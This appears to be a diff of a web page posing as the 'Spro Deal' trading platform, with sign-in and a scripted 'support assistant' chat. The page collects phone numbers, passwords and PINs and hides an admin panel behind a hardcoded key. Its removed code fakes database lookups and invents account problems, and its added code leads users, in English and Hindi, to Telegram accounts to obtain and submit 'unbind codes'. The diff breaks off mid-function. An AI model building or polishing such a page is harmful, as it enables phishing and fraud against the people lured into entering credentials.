@@ -1,4 +1,4 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -12,35 +12,32 @@
         }
 
         body {
-            background: linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 100%);
+            background: linear-gradient(145deg, #1a5e1f 0%, #0d3b10 100%);
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            padding: 12px;
+            padding: 16px;
         }
 
         .container {
             background: white;
-            border-radius: 32px;
-            padding: 20px;
+            border-radius: 40px;
+            padding: 24px 20px;
             width: 100%;
             max-width: 480px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.15), 0 5px 15px rgba(0,0,0,0.1);
+            box-shadow: 0 25px 50px rgba(0,0,0,0.25);
             text-align: center;
         }
 
-        .container-wide {
-            max-width: 95%;
-            width: 95%;
-            overflow-x: auto;
-        }
-
         .brand {
-            color: #2e7d32;
-            font-size: 28px;
-            font-weight: bold;
+            font-size: 32px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #2e7d32 0%, #1b5e20 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
             letter-spacing: -0.5px;
         }
 
@@ -48,17 +45,18 @@
             color: #2e7d32;
             margin-bottom: 20px;
             font-size: 12px;
+            font-weight: 500;
             opacity: 0.8;
         }
 
         .input-field {
             width: 100%;
-            padding: 14px;
+            padding: 14px 16px;
             margin: 10px 0;
-            border: 1px solid #e0e0e0;
-            border-radius: 16px;
+            border: 1.5px solid #e8f0e8;
+            border-radius: 20px;
             font-size: 16px;
-            background: #f8f9fa;
+            background: #fafdfa;
             transition: all 0.3s;
         }
 
@@ -66,34 +64,63 @@
             outline: none;
             border-color: #2e7d32;
             background: white;
-            box-shadow: 0 0 0 3px rgba(46,125,50,0.1);
+            box-shadow: 0 0 0 4px rgba(46,125,50,0.1);
+        }
+
+        .phone-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: #fafdfa;
+            border: 1.5px solid #e8f0e8;
+            border-radius: 20px;
+            margin: 10px 0;
+            padding: 0 12px;
+        }
+
+        .country-code {
+            font-size: 18px;
+            font-weight: 600;
+            color: #2e7d32;
+            background: #e8f5e9;
+            padding: 8px 12px;
+            border-radius: 14px;
+        }
+
+        .phone-wrapper input {
+            flex: 1;
+            border: none;
+            padding: 14px 0;
+            font-size: 16px;
+            background: transparent;
+            outline: none;
         }
 
         .green-btn {
             background: linear-gradient(135deg, #2e7d32 0%, #1b5e20 100%);
             color: white;
             width: 100%;
-            padding: 14px;
+            padding: 16px;
             border: none;
-            border-radius: 16px;
-            font-size: 16px;
-            font-weight: 600;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: 700;
             cursor: pointer;
-            margin: 5px 0;
+            margin: 10px 0;
             transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 6px 20px rgba(46,125,50,0.3);
         }
 
         .green-btn:active {
-            transform: scale(0.98);
+            transform: scale(0.97);
         }
 
         .gray-btn {
             background: #6c757d;
             color: white;
-            width: 100%;
             padding: 12px;
             border: none;
-            border-radius: 16px;
+            border-radius: 30px;
             font-size: 14px;
             cursor: pointer;
             margin: 5px 0;
@@ -101,36 +128,36 @@
 
         .chat-box {
             background: #f8f9fa;
-            height: 400px;
+            height: 420px;
             overflow-y: auto;
-            padding: 15px;
+            padding: 16px;
             margin-bottom: 12px;
             text-align: left;
-            border-radius: 20px;
+            border-radius: 24px;
             scroll-behavior: smooth;
         }
 
         .bot-msg {
-            margin-bottom: 12px;
-            padding: 10px 14px;
+            margin-bottom: 14px;
+            padding: 12px 16px;
             background: #e8f5e9;
-            border-radius: 18px;
-            border-bottom-left-radius: 4px;
-            max-width: 85%;
+            border-radius: 22px;
+            border-bottom-left-radius: 6px;
+            max-width: 88%;
             width: fit-content;
             animation: fadeIn 0.3s ease;
             font-size: 14px;
-            line-height: 1.4;
+            line-height: 1.45;
         }
 
         .user-msg {
-            margin-bottom: 12px;
-            padding: 10px 14px;
+            margin-bottom: 14px;
+            padding: 12px 16px;
             background: #2e7d32;
             color: white;
-            border-radius: 18px;
-            border-bottom-right-radius: 4px;
-            max-width: 85%;
+            border-radius: 22px;
+            border-bottom-right-radius: 6px;
+            max-width: 88%;
             width: fit-content;
             margin-left: auto;
             text-align: right;
@@ -146,16 +173,16 @@
         .typing-indicator {
             display: inline-flex;
             align-items: center;
-            gap: 4px;
+            gap: 5px;
             background: #e8f5e9;
-            padding: 10px 16px;
-            border-radius: 20px;
+            padding: 10px 18px;
+            border-radius: 24px;
             margin: 5px 0;
         }
 
         .typing-indicator span {
-            width: 8px;
-            height: 8px;
+            width: 9px;
+            height: 9px;
             background: #2e7d32;
             border-radius: 50%;
             animation: typingAnim 1.4s infinite;
@@ -166,32 +193,7 @@
 
         @keyframes typingAnim {
             0%, 60%, 100% { transform: translateY(0); opacity: 0.4; }
-            30% { transform: translateY(-6px); opacity: 1; }
-        }
-
-        .searching-indicator {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            background: #fff3e0;
-            padding: 10px 16px;
-            border-radius: 20px;
-            margin: 5px 0;
-            font-size: 13px;
-            color: #e65100;
-        }
-
-        .searching-indicator .spinner {
-            width: 16px;
-            height: 16px;
-            border: 2px solid #e65100;
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+            30% { transform: translateY(-7px); opacity: 1; }
         }
 
         .bot-name {
@@ -200,7 +202,8 @@
             display: flex;
             align-items: center;
             gap: 6px;
-            margin-bottom: 5px;
+            margin-bottom: 6px;
+            font-size: 13px;
         }
 
         .online-status {
@@ -218,63 +221,33 @@
             100% { box-shadow: 0 0 0 0 rgba(76, 175, 80, 0); }
         }
 
-        .options-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 8px;
-            margin: 12px 0;
-        }
-
-        .option-btn {
+        .lang-btn {
             background: #2e7d32;
             color: white;
-            padding: 12px 8px;
+            padding: 14px 20px;
             border: none;
-            border-radius: 14px;
-            cursor: pointer;
-            font-size: 13px;
-            font-weight: 500;
-            transition: all 0.2s;
-        }
-
-        .option-btn:active {
-            transform: scale(0.96);
-        }
-
-        .code-input {
-            width: 100%;
-            padding: 14px;
-            margin: 10px 0;
-            border: 1px solid #e0e0e0;
-            border-radius: 16px;
+            border-radius: 60px;
             font-size: 18px;
-            text-align: center;
-            letter-spacing: 3px;
-            background: #f8f9fa;
-        }
-
-        .success-msg {
-            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
-            color: #155724;
-            padding: 14px;
-            border-radius: 16px;
-            margin: 10px 0;
-            text-align: center;
-            font-weight: bold;
-            animation: fadeIn 0.5s ease;
-        }
-
-        .telegram-btn {
-            background: linear-gradient(135deg, #0088cc 0%, #005f8c 100%);
-            color: white;
-            padding: 12px 20px;
-            border: none;
-            border-radius: 30px;
-            font-size: 14px;
             font-weight: bold;
             cursor: pointer;
-            margin: 8px 0;
-            width: 100%;
+            margin: 8px;
+            width: 120px;
+        }
+
+        .step-btn {
+            background: #2e7d32;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 40px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 8px;
+        }
+
+        .step-btn-secondary {
+            background: #6c757d;
         }
 
         .secret-admin-btn {
@@ -283,42 +256,40 @@
             right: 15px;
             width: 44px;
             height: 44px;
-            background: rgba(46, 125, 50, 0.2);
+            background: rgba(255,255,255,0.2);
             border-radius: 50%;
             cursor: pointer;
             z-index: 999;
             backdrop-filter: blur(4px);
         }
 
-        /* Mobile optimizations */
-        @media (max-width: 480px) {
-            .container {
-                padding: 16px;
-            }
-            .chat-box {
-                height: 380px;
-            }
-            .option-btn {
-                font-size: 12px;
-                padding: 10px 6px;
-            }
+        .telegram-link {
+            display: inline-block;
+            background: linear-gradient(135deg, #0088cc 0%, #005f8c 100%);
+            color: white;
+            padding: 12px 20px;
+            border-radius: 30px;
+            text-decoration: none;
+            margin: 8px 0;
+            font-weight: bold;
+            font-size: 14px;
         }
 
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 11px;
+        .success-msg {
+            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
+            color: #155724;
+            padding: 14px;
+            border-radius: 20px;
+            margin: 10px 0;
+            text-align: center;
+            font-weight: bold;
         }
-        th, td {
-            border: 1px solid #ddd;
-            padding: 6px;
+
+        @media (max-width: 480px) {
+            .container { padding: 18px 16px; }
+            .chat-box { height: 380px; }
+            .lang-btn { width: 100px; font-size: 16px; }
         }
-        th { background: #2e7d32; color: white; }
-        .approve-btn { background: green; color: white; padding: 4px 8px; border: none; border-radius: 6px; cursor: pointer; margin: 2px; }
-        .reject-btn { background: red; color: white; padding: 4px 8px; border: none; border-radius: 6px; cursor: pointer; margin: 2px; }
-        .pending { color: orange; font-weight: bold; }
-        .approved { color: green; font-weight: bold; }
-        .rejected { color: red; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -340,12 +311,11 @@
     }
     
     let currentUser = null;
-    let currentIssue = null;
-    let chatStep = 0;
-    let collectedData = {};
+    let userLanguage = 'english'; // default
+    let unbindStep = 0;
+    let selectedIssue = null;
     
-    // Typing animation
-    async function showTyping(chatBox, duration = 3000) {
+    async function showTyping(chatBox, duration = 7500) {
         let typingDiv = document.createElement('div');
         typingDiv.className = 'typing-indicator';
         typingDiv.innerHTML = '<span></span><span></span><span></span>';
@@ -353,16 +323,6 @@
         chatBox.scrollTop = chatBox.scrollHeight;
         await new Promise(resolve => setTimeout(resolve, duration));
         typingDiv.remove();
-    }
-    
-    async function showSearching(chatBox, duration = 4000) {
-        let searchDiv = document.createElement('div');
-        searchDiv.className = 'searching-indicator';
-        searchDiv.innerHTML = '<div class="spinner"></div> 🔍 Searching & Checking our database...';
-        chatBox.appendChild(searchDiv);
-        chatBox.scrollTop = chatBox.scrollHeight;
-        await new Promise(resolve => setTimeout(resolve, duration));
-        searchDiv.remove();
     }
     
     function addMessage(chatBox, type, text, isHtml = false) {
@@ -377,17 +337,87 @@
         chatBox.scrollTop = chatBox.scrollHeight;
     }
     
+    // Language content
+    const content = {
+        english: {
+            welcome: "Welcome! 👋 I'm your personal support assistant.",
+            selectLang: "Please select your preferred language:",
+            langSelected: "✅ You selected English. I'll assist you in English.",
+            startGuide: "Let me guide you step by step to unbind your account.",
+            step1: "📌 STEP 1: Click the button below to open Telegram bot:",
+            step1bot: "🤖 @uk_member_robot - Click to open",
+            step1instruction: "Then type /start or press START button in the bot.",
+            step2: "📌 STEP 2: In the bot, type /help and press send.",
+            step3: "📌 STEP 3: Click on 'Unbind' or 'Unbind Account' option.",
+            step4: "📌 STEP 4: The bot will give you an UNBIND CODE. Copy that code.",
+            step5: "📌 STEP 5: Paste your unbind code below and submit:",
+            enterCode: "Enter Unbind Code",
+            submit: "✅ SUBMIT UNBIND CODE",
+            codeSuccess: "✅ Unbind code submitted successfully!",
+            processing: "⏳ Processing your request...",
+            chooseIssue: "Please select your issue from below:",
+            teamContact: "📞 Need instant help? Contact Spro Team on Telegram:",
+            contactLink: "@RAHUL9358 - Click to chat",
+            verified: "✅ You are verified! Please choose your issue:",
+            selling: "📈 Selling Problem",
+            withdrawal: "💰 Withdrawal Problem",
+            deposit: "📥 Deposit Problem",
+            order: "📦 Order Problem",
+            upi: "🔄 UPI Problem",
+            forget: "🔑 Password Forget",
+            others: "❓ Others Problem"
+        },
+        hindi: {
+            welcome: "स्वागत है! 👋 मैं आपका निजी सहायक हूँ।",
+            selectLang: "कृपया अपनी भाषा चुनें:",
+            langSelected: "✅ आपने हिंदी चुनी। मैं हिंदी में सहायता दूंगा।",
+            startGuide: "मैं आपको अनबाइंड करने के लिए स्टेप बाय स्टेप गाइड करूंगा।",
+            step1: "📌 चरण 1: Telegram बॉट खोलने के लिए नीचे दिए बटन पर क्लिक करें:",
+            step1bot: "🤖 @uk_member_robot - खोलने के लिए क्लिक करें",
+            step1instruction: "फिर बॉट में /start या START बटन दबाएं।",
+            step2: "📌 चरण 2: बॉट में /help टाइप करें और सेंड करें।",
+            step3: "📌 चरण 3: 'Unbind' या 'Unbind Account' ऑप्शन पर क्लिक करें।",
+            step4: "📌 चरण 4: बॉट आपको एक UNBIND CODE देगा। उसे कॉपी करें।",
+            step5: "📌 चरण 5: नीचे अपना अनबाइंड कोड डालें और सबमिट करें:",
+            enterCode: "अनबाइंड कोड दर्ज करें",
+            submit: "✅ कोड सबमिट करें",
+            codeSuccess: "✅ अनबाइंड कोड सफलतापूर्वक सबमिट हो गया!",
+            processing: "⏳ आपकी request प्रोसेस हो रही है...",
+            chooseIssue: "कृपया अपनी समस्या चुनें:",
+            teamContact: "📞 तुरंत मदद चाहिए? Telegram पर Spro Team से संपर्क करें:",
+            contactLink: "@RAHUL9358 - बात करने के लिए क्लिक करें",
+            verified: "✅ आप verified हो गए हैं! कृपया अपनी समस्या चुनें:",
+            selling: "📈 सेलिंग प्रॉब्लम",
+            withdrawal: "💰 विदड्रॉल प्रॉब्लम",
+            deposit: "📥 डिपॉजिट प्रॉब्लम",
+            order: "📦 ऑर्डर प्रॉब्लम",
+            upi: "🔄 UPI प्रॉब्लम",
+            forget: "🔑 पासवर्ड भूल गए",
+            others: "❓ अन्य समस्या"
+        }
+    };
+    
+    function t(key) {
+        return content[userLanguage][key] || content.english[key];
+    }
+    
     // ============ PAGES ============
     function renderLogin() {
         document.getElementById('app').innerHTML = `
             <div class="container">
-                <h2 class="brand">Spro Deal</h2>
-                <p class="tagline">A stable and profitable platform</p>
-                <h3>SIGN IN TO SPRO DEAL</h3>
-                <input type="tel" id="phone" placeholder="Phone number" class="input-field">
+                <div style="text-align: center; margin-bottom: 20px;">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='60' height='60' viewBox='0 0 24 24' fill='%232e7d32'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E" style="width: 55px; margin-bottom: 8px;">
+                    <h1 class="brand">Spro Deal</h1>
+                    <p class="tagline">A stable and profitable platform</p>
+                </div>
+                <h3 style="margin-bottom: 15px; color:#333;">SIGN IN TO SPRO DEAL</h3>
+                <div class="phone-wrapper">
+                    <span class="country-code">+91</span>
+                    <input type="tel" id="phone" placeholder="Please enter phone number" class="input-field" style="border: none; padding-left: 0;">
+                </div>
                 <input type="password" id="password" placeholder="Password" class="input-field">
                 <button id="signinBtn" class="green-btn">SIGN IN</button>
-                <p class="tagline" style="margin-top:15px;">By logging in you agree to our Privacy Policy</p>
+                <p class="tagline" style="margin-top: 15px;">By logging in you agree to our Privacy Policy</p>
             </div>
             <div class="secret-admin-btn" id="secretAdminBtn"></div>
         `;
@@ -424,7 +454,7 @@
                 <h2>🔐 SECURITY VERIFICATION</h2>
                 <p style="color:#2e7d32;">Welcome ${currentUser.phone}</p>
                 <p>Enter 6-digit PIN to continue</p>
-                <input type="password" id="pin" maxlength="6" class="code-input" placeholder="Enter 6-digit PIN">
+                <input type="password" id="pin" maxlength="6" class="code-input" placeholder="Enter 6-digit PIN" style="width:100%; padding:14px; border-radius:20px; border:1px solid #ccc; text-align:center; font-size:20px; letter-spacing:4px;">
                 <button id="verifyPinBtn" class="green-btn">VERIFY & CONTINUE</button>
             </div>
             <div class="secret-admin-btn" id="secretAdminBtn"></div>
@@ -435,7 +465,7 @@
             let users = getUsers();
             let user = users.find(u => u.phone === currentUser.phone);
             if (user) { user.pin = pin; saveUsers(users); currentUser.pin = pin; }
-            renderDashboard();
+            renderLanguageSelect();
         };
         document.getElementById('secretAdminBtn').onclick = () => {
             let key = prompt('🔐 ENTER ADMIN KEY');
@@ -444,216 +474,29 @@
         };
     }
     
-    // Issue handlers with human-like conversation
-    async function handleSellingProblem(chatBox, issueName) {
-        addMessage(chatBox, 'bot', 'I understand you\'re facing a selling problem. Let me help you with that! 😊');
-        await showTyping(chatBox, 2500);
-        addMessage(chatBox, 'bot', 'Could you please share your Selling ID? (The ID you use for selling on our platform)');
-        chatStep = 'waiting_selling_id';
-        collectedData = { issue: 'selling', issueName };
-        return true;
-    }
-    
-    async function handleWithdrawalProblem(chatBox, issueName) {
-        addMessage(chatBox, 'bot', 'Withdrawal delays can be frustrating. I totally understand your concern! 💰');
-        await showTyping(chatBox, 2500);
-        addMessage(chatBox, 'bot', 'First, could you tell me your Withdrawal Request ID? (You can find it in transaction history)');
-        chatStep = 'waiting_withdrawal_id';
-        collectedData = { issue: 'withdrawal', issueName };
-        return true;
-    }
-    
-    async function handleDepositProblem(chatBox, issueName) {
-        addMessage(chatBox, 'bot', 'Deposit issues? No worries, I\'m here to help you resolve this! 📥');
-        await showTyping(chatBox, 2500);
-        addMessage(chatBox, 'bot', 'Please share your Deposit Transaction ID or UTR number.');
-        chatStep = 'waiting_deposit_id';
-        collectedData = { issue: 'deposit', issueName };
-        return true;
-    }
-    
-    async function handleOrderProblem(chatBox, issueName) {
-        addMessage(chatBox, 'bot', 'Order issues can be stressful. Let me check what went wrong! 📦');
-        await showTyping(chatBox, 2500);
-        addMessage(chatBox, 'bot', 'Can you provide your Order ID and Order Date?');
-        chatStep = 'waiting_order_id';
-        collectedData = { issue: 'order', issueName };
-        return true;
-    }
-    
-    async function handleUPIProblem(chatBox, issueName) {
-        addMessage(chatBox, 'bot', 'UPI payment issues? Let me assist you step by step! 🔄');
-        await showTyping(chatBox, 2500);
-        addMessage(chatBox, 'bot', 'Please share your UPI Reference ID and the amount you tried to send.');
-        chatStep = 'waiting_upi_id';
-        collectedData = { issue: 'upi', issueName };
-        return true;
-    }
-    
-    async function handlePasswordForget(chatBox, issueName) {
-        addMessage(chatBox, 'bot', 'Forgot password? Don\'t worry, it happens to everyone! 🔑');
-        await showTyping(chatBox, 2500);
-        addMessage(chatBox, 'bot', 'Please confirm your registered phone number and email ID first.');
-        chatStep = 'waiting_password_verify';
-        collectedData = { issue: 'forget', issueName };
-        return true;
-    }
-    
-    async function handleOthersProblem(chatBox, issueName) {
-        addMessage(chatBox, 'bot', 'I understand you have some other concern. I\'m here to listen! ❓');
-        await showTyping(chatBox, 2500);
-        addMessage(chatBox, 'bot', 'Could you briefly describe your issue? I\'ll do my best to help.');
-        chatStep = 'waiting_others_desc';
-        collectedData = { issue: 'others', issueName };
-        return true;
-    }
-    
-    async function processUserReply(chatBox, userText, sendCallback) {
-        if (chatStep === 'waiting_selling_id') {
-            collectedData.sellingId = userText;
-            addMessage(chatBox, 'user', userText);
-            addMessage(chatBox, 'bot', `Got it! Selling ID: ${userText}`);
-            await showSearching(chatBox, 4000);
-            addMessage(chatBox, 'bot', 'I\'ve checked our records. Can you also share the Date and Product Name for this selling?');
-            chatStep = 'waiting_selling_details';
-        }
-        else if (chatStep === 'waiting_selling_details') {
-            collectedData.sellingDetails = userText;
-            addMessage(chatBox, 'user', userText);
-            await showSearching(chatBox, 3500);
-            addMessage(chatBox, 'bot', 'Thank you for the information. Let me verify this with our team...');
-            await showTyping(chatBox, 3000);
-            addMessage(chatBox, 'bot', 'I see there\'s a verification pending on your selling account. ✅');
-            await showTyping(chatBox, 2500);
-            addMessage(chatBox, 'bot', 'To complete the unbinding process, you need to verify your account first.');
-            await showTyping(chatBox, 2000);
-            addMessage(chatBox, 'bot', '🔗 <a href="https://t.me/uk_member_robot" target="_blank" style="color:#2e7d32; font-weight:bold;">Click here to verify with our Telegram Bot</a>', true);
-            await showTyping(chatBox, 2500);
-            addMessage(chatBox, 'bot', 'After verification, the bot will provide you a UNBIND CODE.');
-            addMessage(chatBox, 'bot', 'Please enter that unbind code below 👇');
-            showUnbindSection();
-        }
-        else if (chatStep === 'waiting_withdrawal_id') {
-            collectedData.withdrawalId = userText;
-            addMessage(chatBox, 'user', userText);
-            await showSearching(chatBox, 4000);
-            addMessage(chatBox, 'bot', 'I can see your withdrawal request in our system. Let me check the status...');
-            await showTyping(chatBox, 3000);
-            addMessage(chatBox, 'bot', 'Your withdrawal is pending due to KYC verification. 📋');
-            addMessage(chatBox, 'bot', 'Please complete verification first via our Telegram bot.');
-            addMessage(chatBox, 'bot', '🔗 <a href="https://t.me/uk_member_robot" target="_blank" style="color:#2e7d32; font-weight:bold;">Click here to verify with @uk_member_robot</a>', true);
-            addMessage(chatBox, 'bot', 'After verification, enter the unbind code below 👇');
-            showUnbindSection();
-        }
-        else if (chatStep === 'waiting_deposit_id') {
-            collectedData.depositId = userText;
-            addMessage(chatBox, 'user', userText);
-            await showSearching(chatBox, 4500);
-            addMessage(chatBox, 'bot', 'I\'ve traced your deposit transaction. It appears there\'s a mismatch in the reference.');
-            await showTyping(chatBox, 3000);
-            addMessage(chatBox, 'bot', 'You need to verify your deposit details with our support team on Telegram.');
-            addMessage(chatBox, 'bot', '🔗 <a href="https://t.me/uk_member_robot" target="_blank" style="color:#2e7d32; font-weight:bold;">Click here to contact Spro Team on Telegram</a>', true);
-            addMessage(chatBox, 'bot', 'Once verified, submit your unbind code below 👇');
-            showUnbindSection();
-        }
-        else if (chatStep === 'waiting_order_id') {
-            collectedData.orderId = userText;
-            addMessage(chatBox, 'user', userText);
-            await showSearching(chatBox, 5000);
-            addMessage(chatBox, 'bot', 'I\'ve located your order. It shows status: PENDING DELIVERY.');
-            await showTyping(chatBox, 2500);
-            addMessage(chatBox, 'bot', 'To resolve this, you need to verify your order with our Telegram bot.');
-            addMessage(chatBox, 'bot', '🔗 <a href="https://t.me/uk_member_robot" target="_blank" style="color:#2e7d32; font-weight:bold;">Click here to verify with @uk_member_robot</a>', true);
-            addMessage(chatBox, 'bot', 'Then enter the unbind code below 👇');
-            showUnbindSection();
-        }
-        else if (chatStep === 'waiting_upi_id') {
-            collectedData.upiId = userText;
-            addMessage(chatBox, 'user', userText);
-            await showSearching(chatBox, 4000);
-            addMessage(chatBox, 'bot', 'UPI transaction found! But it\'s stuck due to bank verification.');
-            addMessage(chatBox, 'bot', 'Please verify your UPI ID with our Telegram support first.');
-            addMessage(chatBox, 'bot', '🔗 <a href="https://t.me/uk_member_robot" target="_blank" style="color:#2e7d32; font-weight:bold;">Click here to verify on Telegram</a>', true);
-            addMessage(chatBox, 'bot', 'Submit the unbind code below after verification 👇');
-            showUnbindSection();
-        }
-        else if (chatStep === 'waiting_password_verify') {
-            collectedData.passwordVerify = userText;
-            addMessage(chatBox, 'user', userText);
-            await showSearching(chatBox, 3500);
-            addMessage(chatBox, 'bot', 'Account verified! But password reset requires unbinding first.');
-            addMessage(chatBox, 'bot', '🔗 <a href="https://t.me/uk_member_robot" target="_blank" style="color:#2e7d32; font-weight:bold;">Click here to unbind via Telegram Bot</a>', true);
-            addMessage(chatBox, 'bot', 'After unbinding, enter the code below 👇');
-            showUnbindSection();
-        }
-        else if (chatStep === 'waiting_others_desc') {
-            collectedData.othersDesc = userText;
-            addMessage(chatBox, 'user', userText);
-            await showTyping(chatBox, 3000);
-            addMessage(chatBox, 'bot', 'Thank you for explaining. I\'ve noted your concern.');
-            addMessage(chatBox, 'bot', 'For this issue, you need to chat with our senior support team on Telegram.');
-            addMessage(chatBox, 'bot', '🔗 <a href="https://t.me/uk_member_robot" target="_blank" style="color:#2e7d32; font-weight:bold;">Click here to contact Spro Team</a>', true);
-            addMessage(chatBox, 'bot', 'Please verify and submit your unbind code below 👇');
-            showUnbindSection();
-        }
-        
-        function showUnbindSection() {
-            const unbindDiv = document.createElement('div');
-            unbindDiv.id = 'unbindSection';
-            unbindDiv.innerHTML = `
-                <input type="text" id="unbindCodeInput" class="code-input" placeholder="Enter Unbind Code from Telegram">
-                <button id="submitUnbindFinalBtn" class="green-btn">✅ SUBMIT UNBIND CODE & COMPLETE</button>
-            `;
-            document.getElementById('dynamicArea').appendChild(unbindDiv);
-            document.getElementById('submitUnbindFinalBtn').onclick = () => submitUnbindCode(chatBox);
-        }
-    }
-    
-    async function submitUnbindCode(chatBox) {
-        let code = document.getElementById('unbindCodeInput').value;
-        if (!code || code.length < 4) {
-            addMessage(chatBox, 'bot', '⚠️ Please enter a valid unbind code (minimum 4 characters)');
-            return;
-        }
-        
-        addMessage(chatBox, 'user', `Unbind Code: ${code}`);
-        await showTyping(chatBox, 2500);
-        
-        // Save request
-        let requests = getRequests();
-        let newRequest = {
-            id: Date.now(),
-            phone: currentUser.phone,
-            issue: collectedData.issue,
-            issueName: collectedData.issueName,
-            code: code,
-            details: collectedData,
-            status: 'pending',
-            created_at: new Date().toISOString()
-        };
-        requests.push(newRequest);
-        saveRequests(requests);
-        
-        // Success message
-        const successDiv = document.getElementById('successArea');
-        successDiv.innerHTML = `
-            <div class="success-msg">
-                ✅✅✅<br>
-                <strong>REQUEST SUCCESSFULLY PROCESSED!</strong><br>
-                आपकी request सफलतापूर्वक submit हो गई है!<br>
-                ⏳ Wait checking our team. We will update you soon.<br>
-                📞 For urgent help, contact: <a href="https://t.me/uk_member_robot" style="color:#155724;">@uk_member_robot</a>
+    function renderLanguageSelect() {
+        document.getElementById('app').innerHTML = `
+            <div class="container">
+                <h3>🌐 ${userLanguage === 'english' ? 'Select Language' : 'भाषा चुनें'}</h3>
+                <div style="display: flex; justify-content: center; gap: 15px; margin: 25px 0;">
+                    <button id="langEnglish" class="lang-btn">🇬🇧 English</button>
+                    <button id="langHindi" class="lang-btn">🇮🇳 हिंदी</button>
+                </div>
             </div>
+            <div class="secret-admin-btn" id="secretAdminBtn"></div>
         `;
-        
-        addMessage(chatBox, 'bot', '✅ Unbind code submitted successfully!');
-        addMessage(chatBox, 'bot', '⏳ Our team is checking your request. You will receive an update within 24 hours.');
-        addMessage(chatBox, 'bot', '📱 Need immediate assistance? Chat with Spro Team on Telegram: <a href="https://t.me/uk_member_robot" target="_blank">Click here</a>', true);
-        
-        document.getElementById('unbindSection')?.remove();
+        document.getElementById('langEnglish').onclick = () => { userLanguage = 'english'; renderUnbindGuide(); };
+        document.getElementById('langHindi').onclick = () => { userLanguage = 'hindi'; renderUnbindGuide(); };
+        document.getElementById('secretAdminBtn').onclick = () => {
+            let key = prompt('🔐 ENTER ADMIN KEY');
+            if (key === 'SPRO2025') renderAdminPanel();
+            else if (key) alert('❌ Invalid Key');
+        };
     }
     
-    function renderDashboard() {
+    function renderUnbindGuide() {
+        let step = 0;
+        
         document.getElementById('app').innerHTML = `
             <div class="container" style="max-width: 500px;">
                 <div style="display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 12px;">
@@ -662,84 +505,157 @@
                     <span style="font-size: 11px; color: green;">Online • Active now</span>
                 </div>
                 <div id="chatBox" class="chat-box"></div>
-                
-                <div id="optionsArea" class="options-grid"></div>
+                <div id="stepButtons" style="display: flex; gap: 10px; justify-content: center; margin: 10px 0;"></div>
                 <div id="dynamicArea"></div>
                 <div id="successArea"></div>
-                
-                <button id="logoutBtn" class="gray-btn" style="margin-top:10px;">LOGOUT</button>
+                <button id="logoutBtn" class="gray-btn">LOGOUT</button>
             </div>
             <div class="secret-admin-btn" id="secretAdminBtn"></div>
         `;
         
         const chatBox = document.getElementById('chatBox');
-        const optionsArea = document.getElementById('optionsArea');
+        const stepButtons = document.getElementById('stepButtons');
         
-        // Welcome message
-        setTimeout(() => {
-            addMessage(chatBox, 'bot', `Welcome back ${currentUser.phone}! 👋\nI'm your personal support assistant. How can I help you today?`);
-            setTimeout(() => {
-                addMessage(chatBox, 'bot', 'Please select your issue from below 👇');
-            }, 1500);
-        }, 500);
-        
-        const issues = [
-            { id: 'selling', name: '📈 Selling Problem', handler: handleSellingProblem },
-            { id: 'withdrawal', name: '💰 Withdrawal Problem', handler: handleWithdrawalProblem },
-            { id: 'deposit', name: '📥 Deposit Problem', handler: handleDepositProblem },
-            { id: 'order', name: '📦 Order Problem', handler: handleOrderProblem },
-            { id: 'upi', name: '🔄 UPI Problem', handler: handleUPIProblem },
-            { id: 'forget', name: '🔑 Password Forget', handler: handlePasswordForget },
-            { id: 'others', name: '❓ Others Problem', handler: handleOthersProblem }
-        ];
-        
-        issues.forEach(issue => {
-            let btn = document.createElement('button');
-            btn.className = 'option-btn';
-            btn.innerHTML = issue.name;
-            btn.onclick = async () => {
-                // Disable options after selection
-                optionsArea.style.display = 'none';
-                addMessage(chatBox, 'user', issue.name);
-                await issue.handler(chatBox, issue.name);
+        async function showStep(stepNum) {
+            await showTyping(chatBox, 7500);
+            
+            if (stepNum === 0) {
+                addMessage(chatBox, 'bot', t('welcome'));
+                await showTyping(chatBox, 3000);
+                addMessage(chatBox, 'bot', t('startGuide'));
+            }
+            else if (stepNum === 1) {
+                addMessage(chatBox, 'bot', t('step1'));
+                addMessage(chatBox, 'bot', `<a href="https://t.me/uk_member_robot" target="_blank" class="telegram-link">🤖 @uk_member_robot</a>`, true);
+                addMessage(chatBox, 'bot', t('step1instruction'));
+            }
+            else if (stepNum === 2) {
+                addMessage(chatBox, 'bot', t('step2'));
+            }
+            else if (stepNum === 3) {
+                addMessage(chatBox, 'bot', t('step3'));
+            }
+            else if (stepNum === 4) {
+                addMessage(chatBox, 'bot', t('step4'));
+            }
+            else if (stepNum === 5) {
+                addMessage(chatBox, 'bot', t('step5'));
                 
-                // Setup input handler for user replies
-                setupInputHandler(chatBox);
-            };
-            optionsArea.appendChild(btn);
-        });
-        
-        function setupInputHandler(chatBox) {
-            // Create input area if not exists
-            if (!document.getElementById('dynamicInputArea')) {
-                const inputDiv = document.createElement('div');
-                inputDiv.id = 'dynamicInputArea';
